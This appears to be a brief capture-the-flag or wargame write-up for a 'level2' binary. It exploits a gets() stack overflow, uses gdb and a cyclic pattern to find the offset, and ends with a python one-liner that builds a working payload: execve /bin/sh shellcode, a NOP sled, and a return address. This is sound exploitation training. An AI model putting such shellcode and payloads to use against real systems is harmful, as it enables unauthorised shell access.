First we start by open the file in dogblot. We can see that it use the `gets` function which is vulnerable to overflow attacks.

Here we see that we have to get a shellcode to launch a shell. We can use shell-storm :
https://shell-storm.org/shellcode/index.html

Here we do the same thing that the previous level with the pattern:
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

```
(gdb) r
Starting program: /home/user/level2/level2 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppuuuurrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x75757575 in ?? ()
(gdb) x/s $esp
0xbffff720:      "vvvvwwwwxxxxyyyyzzzz"
```
26-5=21
21*4=84
84-size(shellcode) : 84 - 21= 63
63-size(address) : 63 - 4 = 59

So now we know that our exploit will be compose by :
[21 char of shellcode][a 59 nop sled][4 bytes address]

python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08"' > /tmp/test3
